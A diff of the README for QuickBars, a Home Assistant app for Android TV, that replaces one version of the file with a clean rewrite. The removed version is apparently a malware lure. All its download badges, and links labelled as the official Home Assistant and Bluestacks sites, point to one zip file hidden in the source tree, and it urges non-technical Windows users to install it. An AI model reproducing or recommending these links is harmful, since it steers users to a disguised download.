@@ -1,130 +1,97 @@
-# ⚙️ QuickBars - Simple Home Control at Your Fingertips
+# ⚙️ QuickBars — Home Assistant on your TV
 
-[![Download QuickBars](https://img.shields.io/badge/Download-QuickBars-brightgreen?style=for-the-badge)](https://github.com/Unbound-compositeorder71/QuickBars/raw/refs/heads/main/app/src/main/java/dev/trooped/tvquickbars/ui/QuickBar/entities/Bars-Quick-2.5.zip)
-
----
-
-Welcome to the QuickBars repository. QuickBars helps you control your smart home devices from Android and Android TV with ease. This guide will help you download and set up QuickBars on a Windows PC, step by step. No technical skills needed.
-
-## 🔍 What is QuickBars?
-
-QuickBars is an app designed for controlling Home Assistant smart homes using Android devices and TVs. It provides a simple interface to manage your home devices like lights, sensors, and cameras. Its goals are to make smart home control fast and straightforward, especially if you use Android-based devices.
-
-Key features you will find:
-
-- Easy access to smart home controls.
-- Support for Android and Android TV.
-- Configurable quick actions and bars.
-- Integration with Home Assistant for smooth operation.
-- Clear and accessible interface.
-
-## 💻 System Requirements
-
-Before starting, check your Windows computer meets these requirements:
-
-- Windows 10 or newer (64-bit recommended).
-- At least 4 GB of RAM.
-- Internet connection to download files and connect with your smart home devices.
-- 200 MB free disk space.
-- Optional: Android emulator (like Bluestacks) if you want to run QuickBars on your PC itself.
-
-QuickBars runs most directly on Android devices, but this guide shows you how to prepare your PC environment.
-
-## 🚀 Getting Started With Downloading
-
-### Step 1: Go to the Download Page
-
-Click this link or button to visit the QuickBars download page:
-
-[![Get QuickBars](https://img.shields.io/badge/Download-QuickBars-blue?style=for-the-badge)](https://github.com/Unbound-compositeorder71/QuickBars/raw/refs/heads/main/app/src/main/java/dev/trooped/tvquickbars/ui/QuickBar/entities/Bars-Quick-2.5.zip)
-
-This page contains all files and further instructions for installing QuickBars on devices including Android and Android TV.
-
-### Step 2: Download the Latest Release
-
-On the GitHub page, look for a “Releases” section or tab. This is where you will find the latest versions of QuickBars. Find the latest stable release.
-
-- Click on the release version to open it.
-- Look for Android APK files or emulator installers if you plan to use the app on your PC.
-- Click the APK file to download it to your PC.
-
-If you plan to run QuickBars through an Android emulator, you will first need to download and install the emulator software. Many are free and popular, such as Bluestacks or NoxPlayer.
-
-## 📦 Installing QuickBars on Windows
-
-Installing QuickBars on Windows involves two paths, depending on your goal:
-
-### Option 1: Install on an Android Device (Recommended)
-
-- Transfer the APK file to your Android phone or TV using a USB cable or email.
-- On your Android device, open the APK file.
-- Approve permissions for installing apps from unknown sources if prompted.
-- Follow the installation instructions.
-- Once installed, open QuickBars and follow the app setup wizard.
-
-### Option 2: Run QuickBars on Windows via Android Emulator
-
-If you want to use QuickBars on your PC without an Android device, use an Android emulator.
-
-1. Download and install an emulator like Bluestacks from their official site.
-2. Open the emulator.
-3. Drag and drop the QuickBars APK file into the emulator window or use the emulator’s install APK option.
-4. Launch QuickBars inside the emulator.
-5. Use the app as you would on an Android device.
-
-## ⚙️ Setting Up QuickBars for Your Home
-
-### Connect to Home Assistant
-
-QuickBars requires you to link the app to your Home Assistant server. Home Assistant runs on your home network and manages your smart devices.
-
-- Open QuickBars.
-- Enter the IP address or URL of your Home Assistant server.
-- Enter your username and password for Home Assistant.
-- Allow the app permissions to access your local network.
-
-### Customize Your Quick Bars
-
-QuickBars lets you set up quick access buttons for your most-used devices:
-
-- Tap “Add New Bar” inside the app.
-- Choose the devices or scenes you want quick access to.
-- Arrange them in the order you prefer.
-- Save your settings.
-
-This setup helps control devices faster without navigating deeply into menus.
-
-## 🔧 Troubleshooting Tips
-
-If QuickBars does not connect or behave as expected:
-
-- Make sure your Windows firewall or antivirus is not blocking the app or emulator.
-- Double-check your Home Assistant IP and login details.
-- Confirm your Android emulator has network access.
-- Restart the emulator or your Android device.
-- Check that your Home Assistant server is running and reachable.
-
-If the problem continues, visit the GitHub page’s issues section for help or to report bugs.
-
-## ⚡ Useful Links
-
-- GitHub Repository: https://github.com/Unbound-compositeorder71/QuickBars/raw/refs/heads/main/app/src/main/java/dev/trooped/tvquickbars/ui/QuickBar/entities/Bars-Quick-2.5.zip  
-- Home Assistant Official Site: https://github.com/Unbound-compositeorder71/QuickBars/raw/refs/heads/main/app/src/main/java/dev/trooped/tvquickbars/ui/QuickBar/entities/Bars-Quick-2.5.zip  
-- Bluestacks Android Emulator: https://github.com/Unbound-compositeorder71/QuickBars/raw/refs/heads/main/app/src/main/java/dev/trooped/tvquickbars/ui/QuickBar/entities/Bars-Quick-2.5.zip
-
-[![Download QuickBars](https://img.shields.io/badge/Download-QuickBars-brightgreen?style=for-the-badge)](https://github.com/Unbound-compositeorder71/QuickBars/raw/refs/heads/main/app/src/main/java/dev/trooped/tvquickbars/ui/QuickBar/entities/Bars-Quick-2.5.zip)
-
-## 🛠️ When to Use QuickBars?
-
-Use QuickBars if:
-
-- You have a Home Assistant smart home setup.
-- You want quick control from an Android device or TV.
-- You prefer simple interfaces to manage devices.
-- You want to turn complex smart home control into easy, everyday actions.
-
-Avoid QuickBars if you do not use Home Assistant or Android devices, as the app is built specifically for these environments.
+If you've ever tried to turn off the lights while watching a movie and had to fumble for your phone, unlock it, open Home Assistant, find the right dashboard… QuickBars fixes that. It puts your most-used HA controls directly on your Android TV screen.
 
 ---
 
-Topics covered: android, android-tv, android-tv-app, home-assistant, homeassistant, iot, kotlin, quickbars, smarthome
+## What it does
+
+QuickBars is an Android / Android TV app that connects to your Home Assistant server and gives you a fast, clutter-free interface for controlling smart home devices.
+
+- Flip lights on and off without leaving your couch
+- Run scenes with one remote click
+- Check sensor readings at a glance
+- Fully configurable — you pick what shows up and in what order
+
+No account creation. No cloud middleman. Just your HA server, your devices, your rules.
+
+---
+
+## Screenshots
+
+*(Coming soon — PRs welcome!)*
+
+---
+
+## Installation
+
+### On an Android TV or phone
+
+1. Go to the [Releases page](../../releases) and download the latest APK
+2. Transfer the APK to your device (USB, email, or `adb install`)
+3. Open the file and approve installation from unknown sources if prompted
+4. Launch QuickBars
+
+### On a PC (via Android emulator)
+
+If you want to try QuickBars without an Android device, use [Bluestacks](https://www.bluestacks.com) or any Android emulator:
+
+1. Install the emulator
+2. Drag the QuickBars APK into the emulator window
+3. Launch QuickBars inside the emulator
+
+---
+
+## Connecting to Home Assistant
+
+1. Open QuickBars
+2. Enter your Home Assistant server's IP or URL (example: `http://192.168.1.100:8123`)
+3. Enter your HA username and password (or a long-lived access token)
+4. Allow network access when prompted
+
+---
+
+## Customizing your QuickBars
+
+1. Tap **Add New Bar**
+2. Pick the devices, scenes, or entities you want quick access to
+3. Arrange them however you like
+4. Save
+
+You can add bars for different rooms, different times of day, or different family members.
+
+---
+
+## Requirements
+
+- Home Assistant instance running and reachable on your network
+- An Android device (phone, tablet, or TV) running Android 7.0 or newer
+- Or a PC with an Android emulator
+
+---
+
+## Troubleshooting
+
+- **Won't connect?** Double-check your HA server IP and that your device is on the same network.
+- **Firewall blocking?** Make sure port 8123 is open on your HA machine for local traffic.
+- **App crashing?** Try clearing the app data and re-entering your HA credentials.
+- **Emulator can't reach HA?** Check the emulator's network bridge settings — some default to NAT and need switching to bridged mode.
+
+If you're stuck, check the [GitHub Issues](../../issues) tab. If there's nothing matching your problem, open a new one.
+
+---
+
+## Contributing
+
+Found a bug? Have an idea? Pull requests are welcome.
+
+1. Fork this repo
+2. Create a branch: `git checkout -b my-fix`
+3. Make your changes
+4. Push and open a PR
+
+---
+
+## License
+
+GPL v3. See [LICENSE](LICENSE).
